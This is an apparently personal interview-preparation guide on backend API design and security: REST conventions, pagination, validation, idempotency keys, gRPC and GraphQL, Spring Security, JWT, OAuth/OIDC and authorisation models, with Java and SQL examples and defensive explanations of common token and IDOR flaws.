## APIs | P2 | must

### REST API design

#### Core idea
REST models your system as **resources** (nouns) identified by URLs and manipulated with standard **HTTP methods**, using **status codes** to communicate outcomes. Good API design is about predictability: a client should be able to guess how your API behaves.

#### How it works
**Resources and methods**
| Method | Use | Safe? | Idempotent? |
|---|---|---|---|
| GET `/orders/42` | read | yes | yes |
| POST `/orders` | create (server assigns id) / actions | no | **no** |
| PUT `/orders/42` | replace the whole resource | no | yes |
| PATCH `/orders/42` | partial update | no | not necessarily |
| DELETE `/orders/42` | delete | no | yes |

- *Safe* = no side effects. *Idempotent* = repeating the request has the same effect as doing it once (important for retries).
- Use **plural nouns**, nested only for real ownership (`/users/7/addresses`), and keep URLs shallow.
- Actions that don't map to CRUD: model them as a sub-resource or state change (`POST /orders/42/cancel`, or `POST /payments/42/refunds`).

**Status codes you must know**
| Code | When |
|---|---|
| 200 OK / 201 Created (+ `Location` header) / 204 No Content | success |
| 202 Accepted | async processing started (return a status URL) |
| 400 Bad Request | malformed or invalid input |
| 401 Unauthorized | not authenticated (missing or invalid token) |
| 403 Forbidden | authenticated but not allowed |
| 404 Not Found | resource doesn't exist (or hide its existence from unauthorised users) |
| 409 Conflict | version conflict, duplicate, invalid state transition |
| 412 Precondition Failed | an `If-Match` ETag mismatch |
| 422 Unprocessable Entity | well-formed but semantically invalid (a business rule) |
| 429 Too Many Requests | rate limited (+ `Retry-After`) |
| 500 / 502 / 503 / 504 | server error / bad gateway / unavailable / upstream timeout |

**Error body**: consistent, machine-readable. Spring 6 supports RFC 7807/9457 `ProblemDetail`:
```json
{ "type": "https://api.acme.com/errors/insufficient-stock", "title": "Insufficient stock",
  "status": 409, "detail": "SKU MED-123 has 2 units, requested 5", "instance": "/orders",
  "traceId": "4f9c…", "errors": [{"field": "items[0].qty", "message": "exceeds available"}] }
```
**Other conventions**: JSON with consistent casing (camelCase); ISO-8601 UTC timestamps; money as integer minor units or a decimal string plus a currency; `Cache-Control` and `ETag` for cacheable GETs; HATEOAS is rarely needed in practice.

#### Real-world example
Tata 1mg-style order placement: `POST /v1/orders` with an `Idempotency-Key` header returns `201 Created`, `Location: /v1/orders/ORD123`, and a body. Out of stock → `409` with a problem detail. The payment pending state → `202 Accepted` with `/v1/orders/ORD123/status` to poll (or a webhook).

#### Interview questions
?? PUT vs PATCH vs POST?
PUT replaces the entire resource at a known URI and is idempotent. PATCH applies a partial modification (JSON Merge Patch or JSON Patch) and may or may not be idempotent depending on the operations ("increment" isn't). POST creates subordinate resources or triggers actions; it's not idempotent unless you add idempotency keys.

?? 401 vs 403?
401: "I don't know who you are". The credentials are missing, invalid or expired, and the client should authenticate (WWW-Authenticate header). 403: "I know who you are, and you can't do this". Re-authenticating won't help.

?? How do you design an API for a long-running operation (e.g. a report export)?
`POST /reports` returns `202 Accepted` with a job id and `Location: /reports/jobs/123`. The client polls `GET /reports/jobs/123` (status: PENDING, RUNNING, DONE with a download URL, FAILED), or the server calls a webhook or pushes over WebSocket/SSE. Never hold an HTTP connection open for minutes.

#### Tricky questions
?? Is DELETE idempotent if the second call returns 404?
Yes. Idempotency is about the **server state**, not the response code. After the first call the resource is gone; further calls don't change the state. Returning 404 (or 204) on repeats is fine.

?? Should GET requests ever have a body?
The HTTP spec doesn't forbid it, but semantics are undefined, and many proxies, caches and clients drop it. For complex search queries use query parameters, or `POST /search` (accepting that it's not cacheable by default).

#### Interview simulation
**Interviewer:** "Design the REST API for a food delivery cart and checkout."

**Clarify first:** "Is it mobile and web clients? Is the cart server-side (synced across devices) or client-side? Single restaurant per cart? Do payments happen in the same flow?"

**Answer:** Sketch the resources: `GET/PUT /v1/carts/me`, `POST /v1/carts/me/items`, `PATCH /v1/carts/me/items/{itemId}` (qty), `DELETE …/items/{itemId}`, `POST /v1/orders` (from the cart, with an Idempotency-Key), `GET /v1/orders/{id}`, `POST /v1/orders/{id}/cancel`. Then the status codes for each edge case (an item becomes unavailable → 409; a different restaurant → 409 with a "replace cart?" flow), the error format, auth (a bearer token, so the user comes from the token and is never trusted from the body), pagination for order history, and versioning. Explicitly calling out idempotency for order creation is the senior signal.

### API versioning and pagination

#### Core idea
APIs evolve, but clients (especially mobile apps that never update) can't all change at once. **Versioning** lets you make breaking changes without breaking existing clients. **Pagination** keeps responses small and fast when collections are large.

#### How it works
**Versioning strategies**
| Strategy | Example | Pros / cons |
|---|---|---|
| URI path | `/v1/orders` | most common, visible, easy routing and caching; "not pure REST" |
| Header | `X-API-Version: 2` | clean URLs; harder to test in a browser or cache |
| Media type | `Accept: application/vnd.acme.v2+json` | precise; complex for clients |
| Query param | `?version=2` | simple; easy to forget |

**Avoid needing new versions**: make **additive, backward-compatible** changes (new optional fields, new endpoints). Clients must ignore unknown fields (Jackson: `FAIL_ON_UNKNOWN_PROPERTIES=false`). Breaking changes include removing or renaming fields, changing types or meanings, and making optional input required. Deprecate with headers (`Deprecation`, `Sunset`) and usage metrics before removal.

**Pagination**
**Offset/limit**: `GET /orders?page=3&size=20` → `LIMIT 20 OFFSET 40`.
- Simple, and you can jump to page N and show totals.
- **Slow for deep pages** (the DB still scans and discards OFFSET rows), and **unstable** (inserts or deletes shift rows, causing duplicates or skips).

**Cursor/keyset**: `GET /orders?limit=20&after=eyJjcmVhdGVkQXQiOi…`
```sql
SELECT * FROM orders WHERE user_id = :u AND (created_at, id) < (:lastCreatedAt, :lastId)
ORDER BY created_at DESC, id DESC LIMIT 20;
```
- Uses the index, so it's the same speed at any depth, and stable under inserts.
- No "jump to page 57" and no cheap total count. The cursor is opaque (base64 of the last sort key plus a tie-breaker id).
- Used by Twitter, Slack, Stripe (`starting_after`) and GraphQL connections.

Response shape: `{ "data": [...], "nextCursor": "…", "hasMore": true }`. Also: limit the max page size, and give sorting a deterministic tie-breaker.

#### Real-world example
Your OnTheMove resume mentions versioning, rate limiting and pagination at 50K+ daily requests. A good story: the activity feed used offset pagination; users scrolling deep made `OFFSET 5000` queries slow, and new activities caused duplicates in infinite scroll. Switching to keyset pagination on `(created_at, id)` with a compound index fixed both.

#### Interview questions
?? Offset vs cursor pagination: when do you use which?
Offset for small, mostly static datasets where users need page numbers or totals (admin tables). Cursor for large or fast-changing datasets and infinite scroll (feeds, transaction history), where depth performance and stability matter.

?? How do you make a breaking change to a public API?
Avoid it if possible (additive changes). Otherwise ship `/v2` alongside `/v1`; announce deprecation with `Sunset` headers and docs; monitor v1 usage per client; migrate clients; remove v1 after the sunset date. Internally, both versions can share the service layer with different DTO mappers.

#### Tricky questions
?? Why does keyset pagination need a unique tie-breaker column?
If many rows share the same `created_at`, the condition `created_at < :last` would skip rows that have the same timestamp as the last row of the previous page. Adding `id` as a tie-breaker (`(created_at, id) < (:t, :id)`) makes the ordering total and the cursor exact.

#### Interview simulation
If asked "How would you paginate a transaction history API for 100M users?": a cursor on `(created_at, id)` with an index `(user_id, created_at DESC, id DESC)`, an opaque base64 cursor, a max page size of 100, and no total count (or an approximate one). Mention archived or cold data for very old pages. Discuss why offset fails at depth.

### Validation and global exception handling

#### Core idea
Reject bad input **at the edge** with clear messages, and translate every failure into a **consistent error response**, so the business logic can assume valid data and clients get predictable errors.

#### How it works
**Bean Validation (Jakarta Validation / Hibernate Validator)**
```java
public record CreateOrderRequest(
    @NotBlank String addressId,
    @NotEmpty @Size(max = 50) List<@Valid Item> items,
    @Pattern(regexp = "UPI|CARD|COD") String paymentMode) {
  public record Item(@NotBlank String sku, @Min(1) @Max(10) int qty) {}
}

@PostMapping("/v1/orders")
ResponseEntity<OrderDto> create(@Valid @RequestBody CreateOrderRequest req) { ... }
```
- `@Valid` on the body triggers validation; failures throw `MethodArgumentNotValidException` (400).
- `@Validated` on a class enables method-level validation for `@RequestParam` and `@PathVariable` (throws `ConstraintViolationException`, or `HandlerMethodValidationException` in Spring 6.1+).
- Custom constraints: `@Constraint(validatedBy = …)` for rules like "a valid Indian pincode".
- Validation **groups** for create vs update rules.
- Business rules needing DB state (stock, user status) belong in the **service layer**, not annotations.

**Global exception handling**
```java
@RestControllerAdvice
public class ApiExceptionHandler {
    @ExceptionHandler(MethodArgumentNotValidException.class)
    ProblemDetail validation(MethodArgumentNotValidException ex) {
        ProblemDetail pd = ProblemDetail.forStatusAndDetail(HttpStatus.BAD_REQUEST, "Validation failed");
        pd.setProperty("errors", ex.getBindingResult().getFieldErrors().stream()
            .map(f -> Map.of("field", f.getField(), "message", f.getDefaultMessage())).toList());
        return pd;
    }
    @ExceptionHandler(NotFoundException.class)
    ProblemDetail notFound(NotFoundException ex) { return ProblemDetail.forStatusAndDetail(HttpStatus.NOT_FOUND, ex.getMessage()); }

    @ExceptionHandler(Exception.class)
    ProblemDetail unexpected(Exception ex) {
        log.error("Unhandled error", ex);                     // log full details once
        return ProblemDetail.forStatusAndDetail(HttpStatus.INTERNAL_SERVER_ERROR, "Something went wrong"); // no internals leaked
    }
}
```
Principles: map domain exceptions to status codes in **one place**; never leak stack traces or SQL in responses; include a trace ID; log 5xx at ERROR and 4xx at INFO or WARN (4xx is a client problem; don't page anyone for it).

#### Real-world example
Your Tata 1mg resume mentions "versioned Spring Boot REST APIs with validation and structured exception handling." A crisp story: before, each controller had try/catch blocks returning different error formats, and the mobile team had to special-case each endpoint. A single `@RestControllerAdvice` with a standard error contract (code, message, field errors, traceId) cut client-side error handling code and made on-call debugging faster, because every error log had a trace ID matching the response.

#### Interview questions
?? Where should validation live: controller, service or database?
All three, with different purposes. Controller or DTO: format and shape (required fields, sizes, patterns), giving fast 400s. Service: business invariants needing state (stock available, user active), giving 409/422. Database: constraints as the last line of defence (NOT NULL, UNIQUE, FK, CHECK). These protect against bugs and races (two concurrent requests both passing an "email unique" check in the app).

?? How do you handle a unique constraint violation (duplicate email) correctly?
Don't rely only on "check if exists, then insert" (it's racy). Insert and catch `DataIntegrityViolationException` (constraint name `users_email_key`), mapping it to 409 Conflict. The app-level check can stay for a friendly fast path, but the DB constraint is the source of truth.

#### Tricky questions
?? Your @Valid annotation on a nested list's elements doesn't fire. Why?
Validation cascades only into fields or elements annotated with `@Valid`. You need `List<@Valid Item> items` (or `@Valid` on the field) so each element is validated.

?? Should you return 400 or 422 for a business-rule violation?
Teams differ. A common convention is 400 for syntactic or field validation, 409 for conflicts with current state (duplicates, versions, invalid transitions), and 422 for semantically invalid requests. Consistency across the API matters more than the specific choice, so state your convention.

#### Interview simulation
If asked "How do you design error handling for a microservice API?", describe: the error contract (RFC 7807 with a code and traceId), the exception hierarchy (domain exceptions with error codes), a global handler, mapping of downstream failures (timeouts → 503/504 with retry hints; downstream 4xx → usually 502 or a mapped domain error), logging levels, and never leaking internals. Add one real example from your work.

### Idempotency keys

#### Core idea
Networks fail: a client sends `POST /payments`, the server charges the card, but the response is lost. The client retries, and charges twice. An **idempotency key** lets the server recognise a retry of the same operation and return the original result instead of executing again.

#### How it works
1. The client generates a unique key per logical operation (a UUID) and sends `Idempotency-Key: 7f3a…`. **Retries reuse the same key.**
2. The server, in one atomic step, tries to **insert** `(key, user_id, request_hash, status=IN_PROGRESS)` into an idempotency table with a **unique constraint**.
   - Insert succeeds: this is the first attempt. Process it, then store the **response** (status code plus body) and mark it COMPLETED.
   - Duplicate key + COMPLETED: return the **stored response** (same status code and body).
   - Duplicate key + IN_PROGRESS: return `409 Conflict` (or wait briefly). A concurrent duplicate is in flight.
   - Same key but a **different request body hash**: return `422`, because the key was misused.
3. Keys expire after a retention window (e.g. 24h, as Stripe does).

```sql
CREATE TABLE idempotency_keys (
  key text, user_id bigint, request_hash text, status text, response_code int, response_body jsonb,
  created_at timestamptz default now(), PRIMARY KEY (user_id, key));
```
- Do the business write **and** the idempotency record update in the **same DB transaction** where possible, so they can't diverge.
- When calling downstream services, **pass the key along** (Stripe and Razorpay accept idempotency keys) so they dedupe too.
- **Consumers of message queues** need the same idea: Kafka delivers at least once, so store processed message IDs (or use natural idempotency, such as an upsert by event id) to make handlers idempotent.

#### Real-world example
Stripe's API popularised `Idempotency-Key`; every payment integration (including your Stripe project) should use it. Mobile apps on flaky networks automatically retry `POST /orders`. Without idempotency, users get duplicate orders and support tickets. With it, the retry returns the same order id.

#### Interview questions
?? What makes an operation idempotent, and which HTTP methods are idempotent by definition?
Performing it multiple times has the same effect on server state as performing it once. GET, HEAD, PUT, DELETE and OPTIONS are idempotent by spec; POST and PATCH aren't. You make POST idempotent with idempotency keys or natural keys (e.g. `client_order_ref` unique).

?? Where do you store idempotency keys, and why not just Redis?
In the same database as the business data, ideally in the same transaction, so "the operation happened" and "the key is recorded" are atomic. Redis `SET key NX EX` works as a fast first-line guard, but if Redis says "new", the DB write fails, and the key was set (or vice versa), you get inconsistencies. Some systems use Redis for the in-progress lock and the DB for the final record.

#### Tricky questions
?? Client A and client B accidentally send the same idempotency key. What should happen?
Scope keys per client or user (`PRIMARY KEY (user_id, key)`), so different users never collide. If the same user reuses a key with a different payload, return 422 rather than replaying the wrong response.

?? The server crashes after charging the card but before saving the response. What happens on retry?
The record is stuck IN_PROGRESS. You need a recovery path: after a timeout, a retry may re-run the operation **only if the downstream call itself is idempotent** (you passed the same key to the payment provider, which dedupes), or query the provider for the payment's status by your reference before re-charging. This is why end-to-end idempotency matters.

#### Interview simulation
**Interviewer:** "How do you prevent double payments when the client retries?"

**Clarify:** "Who generates the request: our mobile app or a third-party merchant? Which payment provider? What's the retry policy on the client?"

**Answer:** Idempotency key flow (as above) + unique constraint + stored response + passing the key to the PSP + reconciliation job for stuck IN_PROGRESS records + client guidance (reuse the key on retry, new key for new intent). Mention the message-consumer side (dedupe on event id). This is a very common senior backend question.

### gRPC vs REST vs GraphQL

#### Core idea
Three API styles with different strengths:
- **REST/JSON over HTTP/1.1 or 2**: universal, human-readable, cacheable. The default for public APIs.
- **gRPC**: binary Protobuf over HTTP/2, with code generation and streaming. Fast and strongly typed, ideal for **internal service-to-service** calls.
- **GraphQL**: the client asks for exactly the fields it needs from a typed schema, through one endpoint. Ideal for **varied clients** (mobile and web) aggregating many backends.

#### How it works
| | REST | gRPC | GraphQL |
|---|---|---|---|
| Format | JSON (text) | Protobuf (binary, ~3–10× smaller) | JSON |
| Transport | HTTP/1.1 or 2 | HTTP/2 (multiplexing) | HTTP (usually POST) |
| Contract | OpenAPI (optional) | `.proto` (required, codegen) | schema (required) |
| Streaming | SSE / WebSocket separately | built in: server, client, bidirectional | subscriptions |
| Browser support | native | needs gRPC-Web proxy | native |
| HTTP caching | easy (GET + ETag/CDN) | hard | hard (POST; needs persisted queries) |
| Over/under-fetching | common | fixed messages | solved (client picks fields) |
| Typical use | public APIs, CRUD | internal microservices, low latency | BFF for multiple UIs |

- **gRPC specifics**: deadlines propagate across calls, there are rich status codes, it needs L7 load balancing (HTTP/2 long-lived connections defeat L4 balancing), and schema evolution rules apply (never reuse field numbers; add new optional fields).
- **GraphQL specifics**: the **N+1 problem in resolvers** (fixed with **DataLoader** batching); query cost limiting or depth limits to prevent abusive queries; harder authorization per field; persisted queries for caching and security.

#### Real-world example
A typical architecture: a mobile app talks to a **GraphQL BFF** (one round trip fetches the user, cart and recommendations, with fields tailored per screen). The BFF calls internal services over **gRPC** (fast, typed). Partners integrate through a **public REST API**. Netflix, Airbnb and Uber use combinations like this.

#### Interview questions
?? Why is gRPC faster than REST/JSON?
Binary Protobuf encoding (smaller payloads, faster serialisation than JSON parsing), HTTP/2 multiplexing (many concurrent calls over one connection, header compression), and persistent connections. Streaming also avoids polling.

?? When would you not use GraphQL?
Simple CRUD APIs with one client; public APIs where HTTP caching and CDNs matter a lot; file uploads or downloads; teams without capacity to handle query-cost limiting, N+1 resolver batching and field-level auth. It adds operational complexity.

#### Tricky questions
?? Why does Kubernetes' default Service load balancing work poorly with gRPC?
A Kubernetes Service balances at L4, per **connection**. gRPC keeps one long-lived HTTP/2 connection and multiplexes all requests on it, so every request from a client pod goes to the same server pod. Use client-side load balancing (gRPC's round_robin with headless services) or an L7 proxy or service mesh (Envoy, Istio, Linkerd).

#### Interview simulation
If asked "Your team wants to switch internal APIs from REST to gRPC. What's your view?", be balanced: benefits (latency, typing, streaming, codegen) vs costs (tooling, debugging binary payloads, browser access, L7 load balancing, migration effort). Recommend measuring first: if serialisation or connection overhead isn't the bottleneck, the gain may be small. Suggest a pilot on the highest-traffic internal call path.

## Security | P3

### Spring Security filter chain

#### Core idea
Spring Security is a chain of **servlet filters** that runs before your controllers. Each filter handles one concern (CORS, CSRF, authentication, authorisation, exception translation). Understanding the chain is how you debug "why am I getting 401/403?"

#### How it works
```
HTTP request
 → DelegatingFilterProxy (servlet filter) → FilterChainProxy → SecurityFilterChain (matched by URL)
     → CorsFilter → CsrfFilter → LogoutFilter
     → BearerTokenAuthenticationFilter / UsernamePasswordAuthenticationFilter / your JwtFilter
     → … → ExceptionTranslationFilter → AuthorizationFilter → DispatcherServlet → @Controller
```
- **Authentication**: a filter extracts credentials and calls the `AuthenticationManager`, which delegates to `AuthenticationProvider`s (DAO with a `UserDetailsService` plus `PasswordEncoder`, JWT, LDAP…). On success, an `Authentication` is stored in the `SecurityContextHolder` (a ThreadLocal) for the request.
- **Authorisation**: `AuthorizationFilter` checks URL rules; method security (`@PreAuthorize("hasRole('ADMIN') or #userId == authentication.name")`) checks at the service layer via AOP.
- **ExceptionTranslationFilter**: an `AuthenticationException` gives **401** (via `AuthenticationEntryPoint`); an `AccessDeniedException` gives **403** (via `AccessDeniedHandler`).
- **Stateless APIs**: `SessionCreationPolicy.STATELESS`, and CSRF disabled **only** if you don't use cookies for auth.
- You can define **multiple** `SecurityFilterChain` beans (e.g. `/api/**` with JWT, `/admin/**` with a session login), ordered with `@Order`.

```java
@Bean
SecurityFilterChain api(HttpSecurity http) throws Exception {
    return http
        .securityMatcher("/api/**")
        .csrf(c -> c.disable())                               // stateless bearer tokens, no cookies
        .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .authorizeHttpRequests(a -> a
            .requestMatchers("/api/public/**").permitAll()
            .requestMatchers(HttpMethod.DELETE, "/api/orders/**").hasRole("ADMIN")
            .anyRequest().authenticated())
        .oauth2ResourceServer(o -> o.jwt(Customizer.withDefaults()))   // validates JWTs from your IdP
        .build();
}
```

#### Real-world example
Your Allianz work: "OAuth 2.0 SSO with token validation". Services act as **resource servers**: each validates the JWT signature against the identity provider's JWKS endpoint (keys cached and rotated automatically), checks `iss`, `aud` and `exp`, maps scopes or roles to authorities, and stores the principal in the SecurityContext. Downstream calls propagate the token (or use a client-credentials token).

#### Interview questions
?? Explain the request flow through Spring Security.
The servlet container calls `DelegatingFilterProxy`, which delegates to Spring's `FilterChainProxy`. That selects the first `SecurityFilterChain` matching the request and runs its filters in order. An authentication filter builds an `Authentication` (or not); `AuthorizationFilter` checks access; exceptions are translated into 401 or 403 responses by `ExceptionTranslationFilter`. If everything passes, the request reaches the `DispatcherServlet`.

?? When can you safely disable CSRF protection?
CSRF exploits the browser automatically attaching **cookies**. If your API authenticates purely with `Authorization: Bearer` headers (not cookies), a cross-site form can't attach the token, so CSRF protection isn't needed. If you use session cookies, or store JWTs in cookies, keep CSRF on (or use SameSite cookies plus CSRF tokens).

#### Tricky questions
?? `hasRole("ADMIN")` fails even though the user has the authority "ADMIN". Why?
`hasRole("ADMIN")` checks for the authority **`ROLE_ADMIN`** (it adds the prefix). Either grant `ROLE_ADMIN`, or use `hasAuthority("ADMIN")`. With the JWT resource server, scopes map to `SCOPE_xxx` authorities by default, so configure a `JwtAuthenticationConverter` to map your roles claim.

?? Why is the SecurityContext empty inside an @Async method?
It's stored in a ThreadLocal on the request thread. Use `DelegatingSecurityContextAsyncTaskExecutor`, or pass the needed identity explicitly.

#### Interview simulation
**Interviewer:** "A request with a valid JWT returns 403. Debug it."

**Clarify:** "Is it 403 for every endpoint or just one? Do we use URL rules or `@PreAuthorize`? What does the token contain?"

**Answer flow:** A 403 means authentication succeeded but authorisation failed. Check the mapped authorities (enable `logging.level.org.springframework.security=TRACE`: it logs the authorities and which rule denied access). Common causes: the `ROLE_` prefix mismatch, the roles claim not mapped by the JWT converter, a CSRF token missing on a POST (that also gives 403!), the wrong filter chain matched (ordering), or a method-security SpEL using the wrong parameter name. Mentioning that CSRF failures show up as 403 is a strong detail.

### JWT: structure, signing and revocation

#### Core idea
A **JSON Web Token** is a compact, signed (and optionally encrypted) token carrying **claims** about a user. Because it's signed, a server can verify it **without a database lookup**, which makes it stateless and fast, but also hard to revoke.

#### How it works
`header.payload.signature`, each part base64url-encoded:
```json
// header
{ "alg": "RS256", "kid": "2026-key-1", "typ": "JWT" }
// payload (claims)
{ "iss": "https://auth.acme.com", "sub": "user_123", "aud": "orders-api",
  "exp": 1793161200, "iat": 1793160300, "scope": "orders:read orders:write", "roles": ["CUSTOMER"] }
// signature = sign(base64(header) + "." + base64(payload), key)
```
- **The payload is NOT encrypted**, only encoded. Anyone can read it, so never put secrets or sensitive personal data in it.
- **HS256** (HMAC, a shared secret): every verifier holds the secret and could also *mint* tokens. Fine within one service.
- **RS256/ES256** (asymmetric): the auth server signs with a private key; services verify with the **public key** fetched from a **JWKS** endpoint (selected by `kid`). This is the standard for microservices and SSO.
- **Validation checklist**: signature with an *expected* algorithm (reject `alg: none`, and never let the header choose between HS and RS), `exp`, `nbf`, `iss`, `aud`, then authorisation from scopes or roles.

**Access + refresh tokens**
- **Access token**: short-lived (5–15 min), sent with every API call.
- **Refresh token**: long-lived, stored securely, used only at the auth server to get new access tokens. **Rotate** it on every use and detect reuse (a sign of theft), revoking the whole family.

**Revocation strategies** (since a JWT stays valid until `exp`):
1. Short access-token TTL (limits the damage window).
2. **Denylist** of revoked `jti` IDs in Redis until their expiry (checked per request; adds a lookup).
3. A per-user "tokens valid after" timestamp or **token version** in the DB or cache; reject tokens with an older `iat` or version (logout everywhere, password change).
4. Opaque tokens with **introspection** for high-security endpoints.

**Storage in browsers**: `localStorage` is vulnerable to XSS theft; **HttpOnly, Secure, SameSite cookies** resist XSS but need CSRF consideration. Many teams use the BFF pattern: tokens stay server-side and the browser gets a session cookie.

#### Real-world example
NeuronixAI uses JWT auth. A strong interview story: short-lived access tokens (15 min), refresh tokens stored hashed in Postgres with rotation, logout implemented by deleting the refresh token plus adding the access token's `jti` to a Redis denylist with TTL = remaining lifetime, and RS256 so other services verify with the public key only.

#### Interview questions
?? How do you log out a user with JWT if tokens are stateless?
Delete or revoke the refresh token server-side so no new access tokens can be issued, and either accept that the current access token lives until `exp` (keep it short), or denylist its `jti` in Redis until expiry. For "logout from all devices", bump a per-user token version checked on each request (cached).

?? Why prefer RS256 over HS256 in microservices?
With HS256 every service that verifies tokens needs the shared secret, so any compromised service can forge tokens for all. With RS256 only the auth server holds the private key; services verify with public keys (JWKS), with easy key rotation via `kid`.

#### Tricky questions
?? What is the `alg: none` attack and the HS/RS confusion attack?
`alg: none`: an attacker sends an unsigned token with the header claiming no algorithm; vulnerable libraries accept it. **Key confusion**: a server expecting RS256 accepts a token with HS256 in the header and verifies the HMAC using the **public key as the secret**, which the attacker also knows, so they can forge tokens. Defence: pin the expected algorithm(s) on the server, and never trust the header to choose.

?? Can you put the user's permissions in the JWT? What's the downside?
Yes, it avoids lookups. But permission changes don't take effect until the token expires, and big role lists bloat every request header. Keep coarse roles or scopes in the token, and check fine-grained or critical permissions server-side.

#### Interview simulation
**Interviewer:** "Design authentication for a mobile app and its backend."

**Clarify:** "Are users logging in with a password, OTP or social login? Do we have one backend or many services? What are the security requirements: fintech-level or standard?"

**Answer:** OAuth 2.0 Authorization Code + **PKCE** via an identity provider (or your own auth service); short-lived access JWTs (RS256, JWKS); rotating refresh tokens stored in the device keychain; the API gateway or each service validates tokens; device binding or refresh-reuse detection for theft; rate limiting on login and OTP endpoints; revocation via a token version. Draw the token flow. Mentioning PKCE and refresh rotation shows depth.

### OAuth 2.0, OpenID Connect and SSO

#### Core idea
- **OAuth 2.0** is a **delegated authorisation** framework: it lets an app get an **access token** to call an API on behalf of a user (or itself) without handling the user's password.
- **OpenID Connect (OIDC)** is an **authentication** layer on top of OAuth 2.0: it adds the **ID token** (a JWT about *who* the user is) and a `userinfo` endpoint.
- **SSO** (single sign-on): log in once at an identity provider (Okta, Azure AD/Entra, Keycloak, Cognito) and get access to many apps.

#### How it works
**Roles**: Resource Owner (the user), Client (the app), Authorization Server (the IdP), Resource Server (the API).

**Grant types**
| Flow | Use |
|---|---|
| **Authorization Code + PKCE** | web apps, SPAs, mobile: the standard for user login |
| **Client Credentials** | service-to-service (no user) |
| Device Code | TVs and CLI tools without a browser |
| Refresh Token | get new access tokens |
| ~~Implicit~~, ~~Password~~ | deprecated (OAuth 2.1 removes them) |

**Authorization Code + PKCE flow**
```
1. App creates code_verifier (random) and code_challenge = SHA256(verifier)
2. Browser → /authorize?response_type=code&client_id=..&redirect_uri=..&scope=openid profile orders
                     &state=xyz&code_challenge=..&code_challenge_method=S256
3. User logs in at IdP (SSO session cookie: if already logged in, no prompt)
4. IdP → redirect_uri?code=AUTH_CODE&state=xyz          (check state = CSRF protection)
5. App backend → POST /token {code, code_verifier, client credentials}
6. IdP verifies SHA256(verifier) == challenge → returns access_token (+ id_token, refresh_token)
7. App calls API with Authorization: Bearer <access_token>; API validates via JWKS
```
- **PKCE** stops an intercepted auth code from being exchanged by an attacker (who doesn't have the verifier).
- **state** prevents CSRF on the redirect. **nonce** (OIDC) prevents ID-token replay.
- **Scopes** limit what the access token can do (`orders:read`). **Audience** limits which API accepts it.
- **SSO** works because the IdP keeps its own session cookie: the second app's `/authorize` redirect finds the existing session and returns immediately.
- **SAML** is the older XML-based SSO protocol, still common in enterprises. OIDC is the modern JSON/JWT equivalent.

#### Real-world example
Allianz-style enterprise SSO: employees log in once with Azure AD/Entra (OIDC). Each internal app is an OAuth client; APIs are resource servers validating Entra-issued JWTs (`iss`, `aud` = the API's app id, and a `roles` claim from app-role assignments). Service-to-service calls use client credentials with their own scopes. That's the real shape behind "OAuth 2.0 SSO with token validation" on your resume.

#### Interview questions
?? OAuth vs OIDC?
OAuth 2.0 answers "can this app access this resource?" (authorisation, access tokens meant for APIs). OIDC answers "who is the user?" (authentication, ID tokens meant for the client app). Don't use an access token to identify the user in the client, and don't send ID tokens to APIs.

?? Why is the authorization code flow more secure than the implicit flow?
Implicit returned tokens directly in the URL fragment (exposed in browser history, referrers and extensions) with no client authentication. The code flow returns a short-lived single-use code, exchanged over a back channel (with PKCE and/or a client secret) for tokens, so tokens never pass through the URL.

?? How do microservices authenticate to each other?
OAuth client credentials (each service gets tokens with specific scopes or audiences) or **mTLS** (certificate-based identity, often provided by a service mesh such as Istio/SPIFFE). The user context can be propagated by forwarding the user's token or via token exchange (RFC 8693).

#### Tricky questions
?? Why must the API check the `aud` claim?
Without it, a token issued for a different API (e.g. a low-privilege internal tool) from the same IdP would be accepted by your API: the signature and issuer are both valid. The audience ties the token to its intended recipient.

#### Interview simulation
**Interviewer:** "Explain how SSO worked in your Allianz project."

**Answer structure:** the actors (IdP, client apps, our APIs); the login flow (auth code + PKCE redirect, IdP session for SSO); what our service did (resource server: JWKS validation, `iss`/`aud`/`exp` checks, role mapping into Spring Security authorities, method-level checks); edge cases (key rotation via `kid`, clock skew allowance, token expiry mid-journey handled with a refresh at the frontend or BFF); and what you debugged (e.g. the audience mismatch after a new app registration). Own the parts you actually did; don't overclaim.

### Authorization models: RBAC and ABAC

#### Core idea
**Authorisation** decides *what an authenticated user may do*.
- **RBAC (role-based)**: users get roles, roles get permissions (`ADMIN` can delete orders).
- **ABAC (attribute-based)**: rules evaluate attributes of the user, resource, action and context (an agent may view a claim *if* the claim's region equals the agent's region *and* it's business hours).
- **ReBAC (relationship-based)**: permissions derive from relationships (a user can edit a doc if they're an editor of its folder). Google Zanzibar, OpenFGA and SpiceDB implement this.

#### How it works
- RBAC is simple to reason about and audit, but suffers **role explosion** when you need fine-grained or contextual rules (`EU_SUPPORT_AGENT_LEVEL2_READONLY`…).
- ABAC is expressive but harder to audit and test; rules often live in a policy engine (OPA/Rego, AWS Cedar).
- **Ownership checks** (users can only access *their own* orders) are a form of ABAC and the most commonly missed: this is **IDOR / Broken Object Level Authorization**, number one in the OWASP API Top 10.

```java
@PreAuthorize("hasRole('ADMIN') or @orderSecurity.isOwner(#orderId, authentication)")
public OrderDto getOrder(String orderId) { ... }

// or enforce in the query itself — safest:
Optional<Order> findByIdAndUserId(String id, String userId);
```
Where to enforce: coarse checks at the gateway (authenticated? scope present?) and **fine-grained checks in the service that owns the data** (only it knows the resource's owner).

#### Real-world example
An insurance portal: customers see only their own policies (ownership, enforced in the query); agents see policies in their assigned region (ABAC on region); admins have full access (RBAC). A real bug class: an endpoint `/policies/{id}` checking only "is authenticated", so changing the id in the URL exposes other customers' policies (IDOR). Interviewers love asking how you'd prevent it.

#### Interview questions
?? What is IDOR and how do you prevent it?
Insecure Direct Object Reference: the API trusts a client-supplied id without checking that the user may access that object. Prevent it by always scoping queries by the authenticated principal (`WHERE id = ? AND user_id = ?`), centralising ownership checks, using non-guessable ids as defence in depth (not a fix by itself), and writing tests that try to access other users' resources.

?? RBAC vs ABAC: which would you choose?
Start with RBAC for coarse permissions plus ownership checks. Move to ABAC or a policy engine when rules depend on attributes (region, department, time, resource state) and roles start multiplying. Many systems are hybrids.

#### Tricky questions
?? Should a 403 or a 404 be returned when a user requests someone else's order?
Often **404**, so you don't confirm the resource exists (information disclosure). Use 403 when existence isn't sensitive or the user can see that it exists but can't act on it. Be consistent.

#### Interview simulation
